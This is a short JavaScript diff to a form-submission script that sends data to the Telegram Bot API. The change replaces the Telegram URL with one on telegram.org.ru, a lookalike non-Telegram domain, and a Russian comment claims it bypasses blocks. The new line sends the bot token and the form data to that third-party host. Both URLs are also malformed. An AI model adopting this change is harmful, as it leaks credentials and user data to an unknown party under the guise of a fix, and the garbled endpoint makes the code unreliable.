@@ -140,8 +140,8 @@ document.addEventListener('DOMContentLoaded', () => {
         progressContainer.style.display = 'block';
         progressBar.value = 50;
 
-        // URL для отправки запроса к API Telegram
-        const url = `https://telegram.org{TG_BOT_TOKEN}/sendMessage`;
+       // ЗАМЕНИТЕ НА ЭТУ (она отправляет запросы в обход блокировок):
+const url = `https://telegram.org.ru{TG_BOT_TOKEN}/sendMessage`;
 
         // Отправка данных методом POST
         fetch(url, {
